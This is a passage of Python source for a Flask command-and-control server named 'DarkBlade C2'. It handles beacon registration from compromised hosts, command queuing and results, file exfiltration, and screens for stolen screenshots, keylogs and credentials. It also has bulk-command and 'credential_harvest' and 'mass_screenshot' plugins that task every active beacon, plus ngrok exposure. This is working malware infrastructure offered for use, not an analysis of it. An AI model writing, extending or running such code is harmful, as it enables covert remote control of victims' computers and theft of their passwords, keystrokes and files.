            self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            self.ssl_context.load_cert_chain('cert.pem', 'key.pem')
        
        # Add security headers
        @self.app.after_request
        def add_security_headers(response):
            response.headers['X-Content-Type-Options'] = 'nosniff'
            response.headers['X-Frame-Options'] = 'DENY'
            response.headers['X-XSS-Protection'] = '1; mode=block'
            response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
            # Relaxed CSP to allow SPA assets, inline styles/scripts produced by Next export, images, and blobs
            csp = [
                "default-src 'self'",
                "script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:",
                "style-src 'self' 'unsafe-inline'",
                "img-src 'self' data: blob:",
                "font-src 'self' data:",
                "connect-src 'self'",
                "frame-ancestors 'none'",
            ]
            response.headers['Content-Security-Policy'] = '; '.join(csp)
            return response
        
        # Setup routes
        self._setup_routes()
        
        # Start health monitoring
        self.health_monitor.start()
        
        # Periodic rate limiter cleanup
        self._start_rate_limiter_cleanup()
        
        logger.info(f"Master API Key: {self.master_key}")
        logger.warning("Save this key - it won't be shown again!")
        
        # Start ngrok if enabled
        if use_ngrok and self.ngrok_manager:
            public_url = self.ngrok_manager.start_tunnel(port, ngrok_token)
            if public_url:
                logger.info(f"Public URL: {public_url}")
    
    def _generate_master_key(self):
        """Generate master API key"""
        key = self.db.create_api_key('admin', 'admin', 'read,write,delete,export,manage_users')
        return key
    
    def _verify_permission(self, api_key, required_permission):
        """Verify API key has required permission"""
        user_info = self.db.verify_api_key(api_key)
        if not user_info:
            return False
        return required_permission in user_info['permissions'] or user_info['role'] == 'admin'
    
    def _check_rate_limit(self, identifier):
        """Check rate limit for identifier"""
        if not self.rate_limiter.is_allowed(identifier):
            logger.warning(f"Rate limit exceeded for: {identifier}")
            return False
        return True
    
    def _log_request(self, user='anonymous', status_code=200):
        """Log API request"""
        self.request_logger.log_request(
            request.remote_addr,
            request.method,
            request.path,
            user,
            status_code
        )
    
    def _start_rate_limiter_cleanup(self):
        """Start periodic cleanup of rate limiter"""
        def cleanup_loop():
            while True:
                time.sleep(3600)  # Every hour
                self.rate_limiter.cleanup_old_entries()
        
        thread = Thread(target=cleanup_loop, daemon=True)
        thread.start()
    
    def _setup_routes(self):
        """Setup Flask routes with security enhancements"""
        
        # Web UI
        @self.app.route('/')
        def index():
            # Serve built web UI if available (prefer /c2 SPA)
            try:
                # Prefer c2.html (Next static export page) if present
                c2html = self._webui_dir / 'c2.html'
                if c2html.exists():
                    return send_file(str(c2html))
                # Fallback to /c2/index.html for alternative exports
                idx_c2 = self._webui_dir / 'c2' / 'index.html'
                if idx_c2.exists():
                    return send_file(str(idx_c2))
                # Fallback to root index.html
                idx = self._webui_dir / 'index.html'
                if idx.exists():
                    return send_file(str(idx))
            except Exception:
                pass
            return render_template_string('''
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="utf-8"/>
                    <meta name="viewport" content="width=device-width, initial-scale=1"/>
                    <title>DarkBlade C2</title>
                    <script src="https://cdn.tailwindcss.com"></script>
                    <style>
                        :root{--pink:#ff2f92;--cyan:#00e0ff;--bg:#0b0c10;--panel:#12131a;--text:#e5e7eb}
                        body{background:var(--bg);color:var(--text)}
                        .brand{color:var(--pink)} .accent{color:var(--cyan)}
                        .card{background:var(--panel)}
                        .mono{font-family: ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
                        .btn{background:var(--pink)} .btn:hover{filter:brightness(1.1)}
                        .tab-btn{border-bottom:2px solid transparent}
                        .tab-btn.active{border-color:var(--pink);color:var(--pink)}
                    </style>
                </head>
                <body class="min-h-screen">
                    <header class="flex items-center justify-between p-4 border-b border-zinc-800">
                        <div class="flex items-center gap-3">
                            <img src="/favicon.ico" onerror="this.remove()" class="w-6 h-6"/>
                            <h1 class="text-xl font-bold brand">DarkBlade C2</h1>
                            <span class="text-xs opacity-60">Security Hardened</span>
                        </div>
                        <div class="flex items-center gap-2">
                            <label class="text-sm opacity-70">API Key</label>
                            <input id="apiKey" type="password" class="mono px-2 py-1 rounded bg-zinc-900 border border-zinc-700 w-[380px]" placeholder="Paste API key"/>
                            <label class="text-sm"><input id="showKey" type="checkbox" class="mr-1">show</label>
                            <button id="saveKey" class="px-3 py-1 rounded btn text-black font-semibold">Save</button>
                        </div>
                    </header>

                    <main class="p-4 grid grid-cols-12 gap-4">
                        <aside class="col-span-12 lg:col-span-3 space-y-3">
                            <div class="card rounded p-3">
                                <div class="text-sm opacity-70">Server</div>
                                <div class="mono text-xs mt-1">Local: <span id="srvLocal">{{request.host_url.rstrip('/')}}</span></div>
                                <div class="mono text-xs">Public: <span id="srvPublic">(if using ngrok)</span></div>
                            </div>
                            <div class="card rounded p-3">
                                <div class="text-sm opacity-70 mb-2">Views</div>
                                <nav class="space-y-1">
                                    <button class="w-full text-left tab-btn py-1" data-tab="beacons">Beacons</button>
                                    <button class="w-full text-left tab-btn py-1" data-tab="history">History</button>
                                    <button class="w-full text-left tab-btn py-1" data-tab="screens">Screenshots</button>
                                    <button class="w-full text-left tab-btn py-1" data-tab="keylogs">Keylogs</button>
                                    <button class="w-full text-left tab-btn py-1" data-tab="creds">Credentials</button>
                                </nav>
                            </div>
                        </aside>

                        <section class="col-span-12 lg:col-span-9 space-y-4">
                            <div id="panel-beacons" class="card rounded p-3 hidden">
                                <div class="flex items-center justify-between">
                                    <h2 class="font-semibold">Active Beacons</h2>
                                    <div class="flex items-center gap-2">
                                        <button id="refresh" class="px-3 py-1 rounded bg-zinc-800 border border-zinc-700">Refresh</button>
                                        <span class="text-xs opacity-70">Selected: <input id="selBeacon" class="mono text-xs bg-transparent border-b border-zinc-600 w-64" readonly></span>
                                    </div>
                                </div>
                                <div class="overflow-auto mt-2">
                                    <table class="w-full text-sm">
                                        <thead class="text-left opacity-70">
                                            <tr><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>IP</th><th>Last Seen</th><th>Health</th></tr>
                                        </thead>
                                        <tbody id="beaconRows"></tbody>
                                    </table>
                                </div>
                                <div class="mt-3 flex items-center gap-2">
                                    <input id="cmd" class="mono px-2 py-1 rounded bg-zinc-900 border border-zinc-700 w-full" placeholder="whoami">
                                    <button id="send" class="px-3 py-1 rounded btn text-black font-semibold">Send</button>
                                </div>
                            </div>

                            <div id="panel-history" class="card rounded p-3 hidden">
                                <h2 class="font-semibold mb-2">Command History</h2>
                                <pre id="history" class="mono bg-black/70 p-3 rounded max-h-[420px] overflow-auto"></pre>
                            </div>

                            <div id="panel-screens" class="card rounded p-3 hidden">
                                <h2 class="font-semibold mb-2">Screenshots</h2>
                                <div id="shots" class="grid grid-cols-2 md:grid-cols-3 gap-3"></div>
                            </div>

                            <div id="panel-keylogs" class="card rounded p-3 hidden">
                                <h2 class="font-semibold mb-2">Keylogs</h2>
                                <pre id="keylogBox" class="mono bg-black/70 p-3 rounded max-h-[420px] overflow-auto"></pre>
                            </div>

                            <div id="panel-creds" class="card rounded p-3 hidden">
                                <h2 class="font-semibold mb-2">Credentials</h2>
                                <div id="creds" class="overflow-auto"></div>
                            </div>
                        </section>
                    </main>

                    <script>
                        const apiKeyEl = document.getElementById('apiKey');
                        const showKey = document.getElementById('showKey');
                        const saveKey = document.getElementById('saveKey');
                        const refreshBtn = document.getElementById('refresh');
                        const selBeacon = document.getElementById('selBeacon');
                        const cmd = document.getElementById('cmd');
                        const sendBtn = document.getElementById('send');
                        const historyBox = document.getElementById('history');
                        const beaconRows = document.getElementById('beaconRows');
                        const shots = document.getElementById('shots');
                        const keylogBox = document.getElementById('keylogBox');
                        const credsBox = document.getElementById('creds');

                        // Tabs
                        const tabs = ['beacons','history','screens','keylogs','creds'];
                        const btns = document.querySelectorAll('.tab-btn');
                        function showTab(name){
                            tabs.forEach(t=>{
                                document.getElementById('panel-'+t).classList.toggle('hidden', t!==name);
                            });
                            btns.forEach(b=>b.classList.toggle('active', b.dataset.tab===name));
                        }
                        btns.forEach(b=>b.addEventListener('click',()=>showTab(b.dataset.tab)));
                        showTab('beacons');

                        // Load saved key
                        apiKeyEl.value = localStorage.getItem('darkblade_api_key') || '';
                        showKey.addEventListener('change', () => { apiKeyEl.type = showKey.checked ? 'text' : 'password'; });
                        saveKey.addEventListener('click', () => { localStorage.setItem('darkblade_api_key', apiKeyEl.value.trim()); alert('Saved'); });

                        async function fetchBeacons() {
                            beaconRows.innerHTML = '<tr><td colspan=7 class="opacity-60">Loading...</td></tr>';
                            try {
                                const res = await fetch('/api/beacons', { headers: { 'X-API-Key': apiKeyEl.value.trim() }});
                                if (!res.ok) { beaconRows.innerHTML = `<tr><td colspan=7>Error ${res.status}</td></tr>`; return; }
                                const data = await res.json();
                                const rows = (data.beacons || []).map(b => `
                                    <tr class="hover:bg-zinc-800/60 cursor-pointer" data-id="${b.id}">
                                        <td class="mono text-xs">${b.id}</td>
                                        <td>${b.hostname||''}</td>
                                        <td>${b.username||''}</td>
                                        <td>${b.os||''}</td>
                                        <td>${b.ip||''}</td>
                                        <td class="mono text-xs">${b.last_seen||''}</td>
                                        <td>${b.health||''}</td>
                                    </tr>`).join('');
                                beaconRows.innerHTML = rows || '<tr><td colspan=7 class="opacity-60">No beacons</td></tr>';
                                document.querySelectorAll('#beaconRows tr').forEach(tr => {
                                    tr.addEventListener('click', () => {
                                        document.querySelectorAll('#beaconRows tr').forEach(x=>x.classList.remove('bg-zinc-800'));
                                        tr.classList.add('bg-zinc-800');
                                        const id = tr.getAttribute('data-id');
                                        selBeacon.value = id;
                                        fetchHistory(id); fetchScreens(id); fetchKeylogs(id);
                                    });
                                });
                            } catch (e) { beaconRows.innerHTML = `<tr><td colspan=7>${e}</td></tr>`; }
                        }

                        async function fetchHistory(id) {
                            historyBox.textContent = 'Loading...';
                            try {
                                const res = await fetch(`/api/beacon/${id}/history?limit=50`, { headers: { 'X-API-Key': apiKeyEl.value.trim() }});
                                if (!res.ok) { historyBox.textContent = `Error ${res.status}`; return; }
                                const data = await res.json();
                                const lines = data.history.map(h => `[${h.timestamp}] ${h.operator} ${h.status} > ${h.command}\n${(h.result||'').trim()}\n`).join('\n');
                                historyBox.textContent = lines || 'No history';
                            } catch (e) { historyBox.textContent = String(e); }
                        }

                        async function fetchScreens(id){
                            shots.innerHTML = '<div class="opacity-60">Loading...</div>';
                            try{
                                const res = await fetch(`/api/beacon/${id}/screenshots`, { headers: { 'X-API-Key': apiKeyEl.value.trim() }});
                                if(!res.ok){ shots.innerHTML = `<div>Error ${res.status}</div>`; return; }
                                const data = await res.json();
                                shots.innerHTML = (data.items||[]).map(s=>`<div><div class="mono text-xs opacity-60 mb-1">${s.timestamp}</div><img class="rounded border border-zinc-700" src="/api/screenshot/${s.id}?api_key=${encodeURIComponent(apiKeyEl.value.trim())}"/></div>`).join('') || '<div class="opacity-60">No screenshots</div>';
                            }catch(e){ shots.innerHTML = `<div>${e}</div>`; }
                        }

                        async function fetchKeylogs(id){
                            keylogBox.textContent = 'Loading...';
                            try{
                                const res = await fetch(`/api/beacon/${id}/keylogs`, { headers: { 'X-API-Key': apiKeyEl.value.trim() }});
                                if(!res.ok){ keylogBox.textContent = `Error ${res.status}`; return; }
                                const data = await res.json();
                                keylogBox.textContent = (data.items||[]).map(k=>`[${k.timestamp}] ${k.window} \n${k.keystrokes}`).join('\n\n') || 'No keylogs';
                            }catch(e){ keylogBox.textContent = String(e); }
                        }

                        async function fetchCreds(){
                            credsBox.innerHTML = 'Loading...';
                            try{
                                const res = await fetch(`/api/credentials`, { headers: { 'X-API-Key': apiKeyEl.value.trim() }});
                                if(!res.ok){ credsBox.innerHTML = `Error ${res.status}`; return; }
                                const data = await res.json();
                                const rows = (data.items||[]).map(c=>`<tr><td class="mono text-xs">${c.beacon_id}</td><td>${c.source}</td><td>${c.username}</td><td class="mono">${c.password}</td><td>${c.domain||''}</td><td class="mono text-xs">${c.timestamp}</td></tr>`).join('');
                                credsBox.innerHTML = `<table class="w-full text-sm"><thead class="opacity-70 text-left"><tr><th>Beacon</th><th>Source</th><th>User</th><th>Password</th><th>Domain</th><th>Time</th></tr></thead><tbody>${rows || '<tr><td colspan=6 class="opacity-60">No credentials</td></tr>'}</tbody></table>`;
                            }catch(e){ credsBox.innerHTML = String(e); }
                        }

                        async function sendCommand(){
                            const id = selBeacon.value.trim();
                            if(!id){ alert('Select a beacon first'); return; }
                            const c = cmd.value.trim(); if(!c) return;
                            const res = await fetch(`/api/beacon/${id}/command`, { method:'POST', headers:{ 'Content-Type':'application/json','X-API-Key': apiKeyEl.value.trim() }, body: JSON.stringify({command:c})});
                            if(!res.ok){ alert('Error '+res.status); return; }
                            cmd.value=''; setTimeout(()=>{ fetchHistory(id); }, 1000);
                        }

                        refreshBtn.addEventListener('click', ()=>{ fetchBeacons(); fetchCreds(); });
                        sendBtn.addEventListener('click', sendCommand);
                        window.addEventListener('load', ()=>{ fetchBeacons(); fetchCreds(); });
                    </script>
                </body>
                </html>
            ''')
        
        # API: Beacon registration with auto-tasks
        @self.app.route('/api/beacon/register', methods=['POST'])
        def beacon_register():
            try:
                # Rate limit by IP
                if not self._check_rate_limit(request.remote_addr):
                    abort(429)
                
                data = request.get_json()
                if not data:
                    return jsonify({'error': 'Invalid JSON'}), 400
                
                beacon_id = data.get('beacon_id')
                hostname = data.get('hostname', 'unknown')
                username = data.get('username', 'unknown')
                os_type = data.get('os', 'unknown')
                ip_address = request.remote_addr
                metadata = data.get('metadata', {})
                tags = data.get('tags', '')
                
                if not beacon_id:
                    beacon_id = hashlib.md5(f"{hostname}{username}{time.time()}".encode()).hexdigest()
                
                self.db.register_beacon(beacon_id, hostname, username, os_type, ip_address, metadata, tags)
                
                # Execute auto-tasks
                auto_tasks = self.db.get_auto_tasks('on_register')
                for task in auto_tasks:
                    self.db.add_command(beacon_id, task[2], 'auto-task')
                
                # Audit log
                self.db.add_audit_log('system', 'beacon_register', beacon_id, f'{hostname}/{username}')
                
                self._log_request('beacon', 200)
                
                return jsonify({
                    'status': 'success',
                    'beacon_id': beacon_id,
                    'message': 'Beacon registered'
                })
            
            except ValueError as e:
                self._log_request('beacon', 400)
                return jsonify({'error': str(e)}), 400
            except Exception as e:
                logger.error(f"Beacon registration error: {e}", exc_info=True)
                self._log_request('beacon', 500)
                return jsonify({'error': 'Internal server error'}), 500
        
        # API: Beacon check-in
        @self.app.route('/api/beacon/checkin/<beacon_id>', methods=['POST'])
        def beacon_checkin(beacon_id):
            try:
                # Rate limit by beacon_id
                if not self._check_rate_limit(f"checkin_{beacon_id}"):
                    abort(429)
                
                beacon_id = InputValidator.validate_beacon_id(beacon_id)
                
                cursor = self.db.conn.cursor()
                cursor.execute('UPDATE beacons SET last_seen = ? WHERE id = ?', 
                             (datetime.now().isoformat(), beacon_id))
                self.db.conn.commit()
                
                commands = self.db.get_pending_commands(beacon_id)
                
                return jsonify({
                    'status': 'success',
                    'commands': [{'id': cmd[0], 'command': cmd[1]} for cmd in commands]
                })
            
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
            except Exception as e:
                logger.error(f"Check-in error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500
        
        # API: Command result
        @self.app.route('/api/beacon/result/<int:command_id>', methods=['POST'])
        def command_result(command_id):
            try:
                data = request.get_json()
                if not data:
                    return jsonify({'error': 'Invalid JSON'}), 400
                
                result = data.get('result', '')
                
                self.db.update_command_result(command_id, result)
                
                return jsonify({'status': 'success'})
            
            except Exception as e:
                logger.error(f"Command result error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500
        
        # API: Data exfiltration with encryption
        @self.app.route('/api/beacon/exfil/<beacon_id>', methods=['POST'])
        def exfil_data(beacon_id):
            try:
                beacon_id = InputValidator.validate_beacon_id(beacon_id)
                
                if 'file' in request.files:
                    file = request.files['file']
                    filename = file.filename
                    data = file.read()
                    data_type = 'file'
                else:
                    data_json = request.get_json()
                    filename = data_json.get('filename', 'data.txt')
                    data = data_json.get('data', '').encode()
                    data_type = data_json.get('type', 'text')
                
                # Encrypt data
                encrypted_data = self.encryption.encrypt_data(data)
                
                exfil_id = self.db.store_exfil_data(beacon_id, data_type, filename, encrypted_data, encrypted=True)
                
                return jsonify({
                    'status': 'success',
                    'exfil_id': exfil_id
                })
            
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
            except Exception as e:
                logger.error(f"Exfil error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500
        
        # API: List beacons with filtering
        @self.app.route('/api/beacons', methods=['GET'])
        def list_beacons():
            try:
                api_key = request.headers.get('X-API-Key')
                if not self._verify_permission(api_key, 'read'):
                    self._log_request('unauthorized', 401)
                    return jsonify({'error': 'Unauthorized'}), 401
                
                # Rate limit (per-key)
                if not self._check_rate_limit(f"api_{api_key[:16]}"):
                    abort(429)
                
                user_info = self.db.verify_api_key(api_key)
                
                group = request.args.get('group')
                tags = request.args.get('tags')
                active_only = request.args.get('active') == 'true'
                limit = int(request.args.get('limit', 100))
                offset = int(request.args.get('offset', 0))
                
                beacons = self.db.get_beacons(active_only=active_only, group=group, tags=tags, limit=limit, offset=offset)
                
                self._log_request(user_info['username'], 200)
                
                return jsonify({
                    'beacons': [{
                        'id': b[0],
                        'hostname': b[1],
                        'username': b[2],
                        'os': b[3],
                        'ip': b[4],
                        'first_seen': b[5],
                        'last_seen': b[6],
                        'status': b[7],
                        'tags': b[9],
                        'group': b[10],
                        'health': b[11]
                    } for b in beacons]
                })
            
            except Exception as e:
                logger.error(f"List beacons error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500
        
        # API: Send command with operator tracking
        @self.app.route('/api/beacon/<beacon_id>/command', methods=['POST'])
        def send_command(beacon_id):
            try:
                api_key = request.headers.get('X-API-Key')
                user_info = self.db.verify_api_key(api_key)
                if not user_info or 'write' not in user_info['permissions']:
                    self._log_request('unauthorized', 401)
                    return jsonify({'error': 'Unauthorized'}), 401
                
                # Rate limit
                if not self._check_rate_limit(f"cmd_{user_info['username']}"):
                    abort(429)
                
                data = request.get_json()
                if not data:
                    return jsonify({'error': 'Invalid JSON'}), 400
                
                command = data.get('command')
                
                if not command:
                    return jsonify({'error': 'No command specified'}), 400
                
                command_id = self.db.add_command(beacon_id, command, user_info['username'])
                
                # Audit log
                self.db.add_audit_log(user_info['username'], 'send_command', beacon_id, command)
                
                self._log_request(user_info['username'], 200)
                
                return jsonify({
                    'status': 'success',
                    'command_id': command_id
                })
            
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
            except Exception as e:
                logger.error(f"Send command error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500
        
        # Additional routes would follow the same pattern with:
        # - Input validation
        # - Rate limiting
        # - Proper error handling
        # - Request logging
        # - Audit logging
        
        # API: Command history for a beacon
        @self.app.route('/api/beacon/<beacon_id>/history', methods=['GET'])
        def beacon_history(beacon_id):
            try:
                api_key = request.headers.get('X-API-Key')
                if not self._verify_permission(api_key, 'read'):
                    self._log_request('unauthorized', 401)
                    return jsonify({'error': 'Unauthorized'}), 401
                # Rate limit
                if not self._check_rate_limit(f"hist_{beacon_id}"):
                    abort(429)
                limit = request.args.get('limit', 100)
                rows = self.db.get_command_history(beacon_id, limit)
                out = []
                for r in rows:
                    out.append({
                        'id': r[0],
                        'command': r[1],
                        'timestamp': r[2],
                        'status': r[3],
                        'result': r[4],
                        'operator': r[5],
                    })
                return jsonify({'history': out})
            except Exception as e:
                logger.error(f"Beacon history error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500

        # API: Screenshots list for beacon
        @self.app.route('/api/beacon/<beacon_id>/screenshots', methods=['GET'])
        def beacon_screenshots(beacon_id):
            try:
                api_key = request.headers.get('X-API-Key')
                if not self._verify_permission(api_key, 'read'):
                    return jsonify({'error': 'Unauthorized'}), 401
                limit = int(request.args.get('limit', 30))
                offset = int(request.args.get('offset', 0))
                cursor = self.db.conn.cursor()
                cursor.execute('SELECT id, timestamp FROM screenshots WHERE beacon_id = ? ORDER BY timestamp DESC LIMIT ? OFFSET ?', (beacon_id, limit, offset))
                items = [{'id': r[0], 'timestamp': r[1]} for r in cursor.fetchall()]
                return jsonify({'items': items})
            except Exception as e:
                logger.error(f"Screenshots list error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500

        # API: Serve screenshot image (supports header or ?api_key=)
        @self.app.route('/api/screenshot/<int:shot_id>', methods=['GET'])
        def get_screenshot(shot_id):
            try:
                api_key = request.headers.get('X-API-Key') or request.args.get('api_key')
                if not self._verify_permission(api_key, 'read'):
                    return jsonify({'error': 'Unauthorized'}), 401
                cursor = self.db.conn.cursor()
                cursor.execute('SELECT image_data, timestamp FROM screenshots WHERE id = ?', (shot_id,))
                row = cursor.fetchone()
                if not row:
                    return jsonify({'error': 'Not found'}), 404
                data = row[0]
                return send_file(io.BytesIO(data), mimetype='image/png')
            except Exception as e:
                logger.error(f"Serve screenshot error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500

        # API: Keylogs for beacon
        @self.app.route('/api/beacon/<beacon_id>/keylogs', methods=['GET'])
        def beacon_keylogs(beacon_id):
            try:
                api_key = request.headers.get('X-API-Key')
                if not self._verify_permission(api_key, 'read'):
                    return jsonify({'error': 'Unauthorized'}), 401
                limit = int(request.args.get('limit', 100))
                offset = int(request.args.get('offset', 0))
                cursor = self.db.conn.cursor()
                cursor.execute('SELECT keystrokes, window_title, timestamp FROM keylogs WHERE beacon_id = ? ORDER BY timestamp DESC LIMIT ? OFFSET ?', (beacon_id, limit, offset))
                items = [{'keystrokes': r[0], 'window': r[1], 'timestamp': r[2]} for r in cursor.fetchall()]
                return jsonify({'items': items})
            except Exception as e:
                logger.error(f"Keylogs list error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500

        # API: Credentials (optionally filter by beacon)
        @self.app.route('/api/credentials', methods=['GET'])
        def list_credentials():
            try:
                api_key = request.headers.get('X-API-Key')
                if not self._verify_permission(api_key, 'read'):
                    return jsonify({'error': 'Unauthorized'}), 401
                beacon = request.args.get('beacon')
                limit = int(request.args.get('limit', 100))
                offset = int(request.args.get('offset', 0))
                cursor = self.db.conn.cursor()
                if beacon:
                    cursor.execute('SELECT beacon_id, source, username, password, domain, timestamp FROM credentials WHERE beacon_id = ? ORDER BY timestamp DESC LIMIT ? OFFSET ?', (beacon, limit, offset))
                else:
                    cursor.execute('SELECT beacon_id, source, username, password, domain, timestamp FROM credentials ORDER BY timestamp DESC LIMIT ? OFFSET ?', (limit, offset))
                items = [{'beacon_id': r[0], 'source': r[1], 'username': r[2], 'password': r[3], 'domain': r[4], 'timestamp': r[5]} for r in cursor.fetchall()]
                return jsonify({'items': items})
            except Exception as e:
                logger.error(f"Credentials list error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500

        # API: List exfil files for a beacon
        @self.app.route('/api/beacon/<beacon_id>/files', methods=['GET'])
        def list_beacon_files(beacon_id):
            try:
                api_key = request.headers.get('X-API-Key')
                if not self._verify_permission(api_key, 'read'):
                    return jsonify({'error': 'Unauthorized'}), 401
                limit = int(request.args.get('limit', 100))
                rows = self.db.list_exfil_by_beacon(beacon_id, limit)
                items = [{'id': r[0], 'type': r[1], 'filename': r[2], 'size': r[3], 'timestamp': r[4]} for r in rows]
                return jsonify({'items': items})
            except Exception as e:
                logger.error(f"List files error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500

        # API: Download exfil file
        @self.app.route('/api/file/<int:file_id>', methods=['GET'])
        def download_file(file_id):
            try:
                api_key = request.headers.get('X-API-Key') or request.args.get('api_key')
                if not self._verify_permission(api_key, 'read'):
                    return jsonify({'error': 'Unauthorized'}), 401
                row = self.db.get_exfil_blob(file_id)
                if not row:
                    return jsonify({'error': 'Not found'}), 404
                filename, blob, encrypted = row
                # Note: if encrypted is True, client must decrypt with saved key; we serve raw
                return send_file(io.BytesIO(blob), as_attachment=True, download_name=filename)
            except Exception as e:
                logger.error(f"Download file error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500

        # API: Delete exfil file
        @self.app.route('/api/file/<int:file_id>', methods=['DELETE'])
        def delete_file(file_id):
            try:
                api_key = request.headers.get('X-API-Key')
                if not self._verify_permission(api_key, 'delete'):
                    return jsonify({'error': 'Unauthorized'}), 401
                n = self.db.delete_exfil(file_id)
                return jsonify({'deleted': n})
            except Exception as e:
                logger.error(f"Delete file error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500

        # API: Bulk command to many beacons
        @self.app.route('/api/beacons/bulk/command', methods=['POST'])
        def bulk_command():
            try:
                api_key = request.headers.get('X-API-Key')
                user = self.db.verify_api_key(api_key)
                if not user or 'write' not in user['permissions']:
                    return jsonify({'error': 'Unauthorized'}), 401
                data = request.get_json() or {}
                command = (data.get('command') or '').strip()
                ids = data.get('beacon_ids') or []
                group = data.get('group')
                tags = data.get('tags')
                if not command:
                    return jsonify({'error': 'No command specified'}), 400
                # resolve target set
                target_ids = set(ids)
                if group or tags:
                    rows = self.db.get_beacons(active_only=False, group=group, tags=tags)
                    for r in rows:
                        target_ids.add(r[0])
                count = 0
                for bid in target_ids:
                    try:
                        self.db.add_command(bid, command, user['username'])
                        count += 1
                    except Exception:
                        pass
                return jsonify({'sent': count})
            except Exception as e:
                logger.error(f"Bulk command error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500

        # API: API key management (admin)
        @self.app.route('/api/keys', methods=['GET', 'POST'])
        def api_keys():
            try:
                api_key = request.headers.get('X-API-Key')
                user = self.db.verify_api_key(api_key)
                if not user or user['role'] != 'admin':
                    return jsonify({'error': 'Unauthorized'}), 401
                if request.method == 'GET':
                    rows = self.db.list_api_keys()
                    items = [{'key_hash': r[0], 'username': r[1], 'role': r[2], 'description': r[3], 'created': r[4], 'last_used': r[5], 'permissions': r[6]} for r in rows]
                    return jsonify({'keys': items})
                data = request.get_json() or {}
                username = data.get('username') or 'operator'
                role = data.get('role') or 'operator'
                perms = data.get('permissions') or 'read,write'
                key = self.db.create_api_key(username, role, perms)
                return jsonify({'key': key})
            except Exception as e:
                logger.error(f"API key mgmt error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500

        @self.app.route('/api/keys/<key_hash>', methods=['DELETE'])
        def api_keys_delete(key_hash):
            try:
                api_key = request.headers.get('X-API-Key')
                user = self.db.verify_api_key(api_key)
                if not user or user['role'] != 'admin':
                    return jsonify({'error': 'Unauthorized'}), 401
                n = self.db.delete_api_key(key_hash)
                return jsonify({'deleted': n})
            except Exception as e:
                logger.error(f"API key delete error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500
        
        logger.info("All routes configured with security enhancements")

        # Serve static assets from webui folder
        @self.app.route('/<path:path>')
        def static_proxy(path):
            # let API endpoints pass through
            if path.startswith('api/'):
                abort(404)
            target = self._webui_dir / path
            try:
                if target.exists() and target.is_file():
                    return send_file(str(target))
                # try HTML suffix (Next export uses route.html)
                target_html = self._webui_dir / f"{path}.html"
                if target_html.exists():
                    return send_file(str(target_html))
                # fallback to SPA index
                idx = self._webui_dir / 'index.html'
                if idx.exists():
                    return send_file(str(idx))
            except Exception:
                pass
            abort(404)
    
    def run(self):
        """Start C2 server"""
        protocol = 'https' if self.use_ssl else 'http'
        logger.info(f"Starting DarkSec C2 Server - Security Hardened Edition")
        logger.info(f"Listening on {self.host}:{self.port}")
        logger.info(f"Web Interface: {protocol}://{self.host}:{self.port}")
        logger.info(f"API Endpoint: {protocol}://{self.host}:{self.port}/api")
        logger.info(f"Features: SSL={self.use_ssl}, Ngrok={self.use_ngrok}")
        logger.info("Security Features: Rate Limiting, Input Validation, Audit Logging, CSRF Protection")
        logger.info("Press Ctrl+C to stop")
        
        try:
            if self.use_ssl:
                self.app.run(host=self.host, port=self.port, debug=False, threaded=True, ssl_context=self.ssl_context)
            else:
                self.app.run(host=self.host, port=self.port, debug=False, threaded=True)
        except KeyboardInterrupt:
            logger.info("Shutting down...")
            self.health_monitor.stop()
            if self.ngrok_manager:
                self.ngrok_manager.stop_tunnel()

# Example plugins
@register_plugin('mass_screenshot')
def mass_screenshot(server, data):
    """Take screenshots from all active beacons"""
    beacons = server.db.get_beacons(active_only=True)
    count = 0
    for beacon in beacons:
        beacon_id = beacon[0]
        server.db.add_command(beacon_id, 'SCREENSHOT:capture', 'plugin')
        count += 1
    return f'Screenshot command sent to {count} beacons'

@register_plugin('credential_harvest')
def credential_harvest(server, data):
    """Harvest credentials from all active beacons"""
    beacons = server.db.get_beacons(active_only=True)
    count = 0
    for beacon in beacons:
        beacon_id = beacon[0]
        server.db.add_command(beacon_id, 'CRED:dump_all', 'plugin')
        count += 1
    return f'Credential harvest command sent to {count} beacons'

def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='DarkSec C2 Server - Security Hardened')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=8443, help='Port to listen on')
    parser.add_argument('--ssl', action='store_true', help='Enable SSL/TLS (HTTPS)')
    parser.add_argument('--ngrok', action='store_true', help='Enable ngrok tunnel')
    parser.add_argument('--ngrok-token', help='Ngrok auth token')
    parser.add_argument('--db', default='c2_data.db', help='Database file path')
    
    args = parser.parse_args()
    
    try:
        server = C2Server(
            host=args.host, 
            port=args.port,
            use_ssl=args.ssl,
            use_ngrok=args.ngrok,
            ngrok_token=args.ngrok_token
        )
        server.run()
    except KeyboardInterrupt:
        logger.info("Shutting down DarkSec C2 server...")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)

if __name__ == '__main__':
    main()
